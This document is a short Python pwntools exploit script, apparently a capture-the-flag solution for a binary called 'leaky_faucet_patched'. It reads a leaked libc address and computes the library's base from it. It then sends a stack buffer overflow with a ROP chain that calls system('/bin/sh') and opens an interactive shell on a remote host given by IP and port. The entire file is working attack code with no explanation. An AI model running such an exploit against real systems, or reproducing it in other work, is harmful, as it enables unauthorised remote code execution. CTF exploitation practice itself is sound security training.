#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./leaky_faucet_patched")
libc = ELF("./libc.6.so")

context.binary = exe

REMOTE_NC_CMD    = " nc 165.227.103.166 6004 "    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main+296
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.recvuntil(b"0x")
    leak = int(b"0x"+r.recvuntil(b" ")[:-2], 16)
    libc.address = leak - libc.sym.system

    rop = ROP(libc)

    POP_RDI = p64(rop.rdi.address)
    RET = p64(rop.ret.address)

    r.sendline(b"A"*40 + POP_RDI + p64(libc.binsh()) + RET + p64(libc.sym.system))

    r.interactive()

if __name__ == "__main__":
    main()